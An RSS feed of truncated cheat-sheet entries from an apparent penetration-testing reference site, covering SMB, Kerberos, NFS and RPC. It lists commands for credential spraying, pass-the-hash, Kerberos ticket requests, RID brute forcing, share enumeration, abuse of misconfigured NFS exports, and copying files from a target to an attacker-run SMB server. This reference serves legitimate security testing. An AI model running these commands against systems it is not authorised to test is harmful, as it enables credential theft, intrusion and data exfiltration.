channel.title: Smb on TLDRBins
channel.description: Recent content in Smb on TLDRBins

item.title: File Transfer (Windows To Linux)
item.description: SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\<LOCAL_IP>\share # Connect to SMB server with creds net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # From target Windows to local Linux copy <FILE> \\<LOCAL_IP>\share # From local Linux to target Windows copy \\<LOCAL_IP>\share\<FILE> <FILE> # Delete file del <FILE> # Remove SMB share net use /d \\<LOCAL_IP>\share # Older Windows (e.

item.title: Kerberos
item.description: Users enum kerbrute kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE> Ref: kerbrute Usernames generator username-anarchy ./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE> Ref: username-anarchy Generate Kerberos ticket (From Linux) Impacket Kinit # Auth with password sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' # Auth with hash sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>' export KRB5CCNAME=<USER>.ccache # Check ticket klist # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work) <TARGET> <DC> <DOMAIN> # Step 2: Add domain controller as a DNS server to '/etc/resolv.

item.title: Mount Share
item.description: nfs smb List share showmount -e <TARGET> Mount share sudo mount -t nfs <TARGET>:/share /mnt/share/ Unmount share sudo umount /mnt/share/ Mount share sudo mount -t cifs //<TARGET>/share /mnt # Without creds sudo mount -t cifs -o user=,password= //<TARGET>/share /mnt # With creds sudo mount -t cifs -o user=<USER>,pass='<PASSWORD>' //<TARGET>/share /mnt Mount inside Windows # Mount net use \\localhost\c$ /u:<DOMAIN>\<USER> '<PASSWORD>' # Check dir \\localhost\c$\users\administrator\desktop Abuse #1: Misconfigured Share # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +-----------------------------------------------------------------------------------------+ | root_squash : running as root on local system will be treated as nobody user in target | | no_all_squash: every other users permission will translate from local system to target | +-----------------------------------------------------------------------------------------+ # Add dummy user sudo useradd dummy # Change uid sudo usermod -u 1001 dummy # Switch to dummy user sudo su dummy -c bash

item.title: NetExec (nxc)
item.description: Basic Commands # Single user and password nxc smb <TARGET> -u <USER> -p '<PASSWORD>' # Single user and password (Active Directory) nxc smb -u <USER> -p '<PASSWORD>' -d <DOMAIN> <TARGET> # Multiple users or passwords nxc smb -u <USERNAMES> -p '<PASSWORD>' -d <DOMAIN> <TARGET> --continue-on-success # Match username to corresponding password nxc smb <TARGET> -u <USERNAMES> -p <PASSWORDS> --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb <TARGET> -u <USER> -H <LM>:<NT> # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc smb -u <USER> -p '<PASSWORD>' -d <DOMAIN> -k <TARGET> Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ RID Brute nxc smb <TARGET> -u guest -p '' --rid-brute 10000 User Enum (Authenticated) nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users Ref: Download nxc

item.title: RPC
item.description: Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U '' -N <TARGET> # Connect with creds rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> # Inline execute command rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup <RID> # Query group member by rid querygroupmem <RID> # Query user by rid queryuser <RID> # Look up a user lookupnames <USER> # Look up by SID lookupsids <SID> impacket-lookupsid '<USER>:<PASSWORD>@<TARGET>'

item.title: SMB Enum
item.description: SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 <TARGET> Anonymous Login smbmap smbclient impacket smbmap -H <TARGET> --no-banner smbmap -H <TARGET> -u null --no-banner # List known share smbmap -H <TARGET> -r <SHARE> smbclient -N -L \\\\<TARGET>\\ # After found an accessible share smbclient -N \\\\<TARGET>\\<SHARE>\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\<TARGET>\\ --option='client min protocol=NT1' # SID brute, if null auth allowed impacket-lookupsid test@<DOMAIN> -no-pass Authenticated smbmap smbclient smbmap -H <TARGET> -u <USER> -p '<PASSWORD>' # List known share smbmap -H <TARGET> -u <USER> -p '<PASSWORD>' -R <SHARE> # Download file smbmap -H <TARGET> -r <SHARE> --download <PATH_TO_FILE> # List files with regex pattern smbmap -H <TARGET> -u <USER> -p '<PASSWORD>' -r <SHARE> -A <FILE_PATTERN> smbclient -L \\\\<TARGET>\\ -U '<DOMAIN>/<USER>%<PASSWORD>' # After found an accessible share smbclient \\\\<TARGET>\\<SHARE>\\ -U '<DOMAIN>/<USER>%<PASSWORD>' Authenticated with Kerberos impacket impacket-smbclient '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' -k -no-pass Basic commands # List all files in a share recurse ON ls # Download all files mask "" recurse ON prompt OFF mget * List Alternate Data Streams (ADS) allinfo <FILE> # Example Response >>>stream: [:Password:$DATA], 15 bytes # Download specific data stream get "<FILE>:Password" Mount SMB Share Anonymous Authenticated sudo mount -t cifs //<TARGET>/<SHARE> /mnt sudo mount -t cifs -o ro,user=<USER>,password='<PASSWORD>' //<TARGET>/<SHARE> /mnt Check write permission sudo find .

item.title: SMB Server
item.description: Start a SMB Server for File Transfer Anonymous Authenticate Older Windows impacket-smbserver share . -smb2support impacket-smbserver share . -smb2support -username <USER> -password '<PASSWORD>' Note: Sometimes smb server with creds may not work impacket-smbserver share .
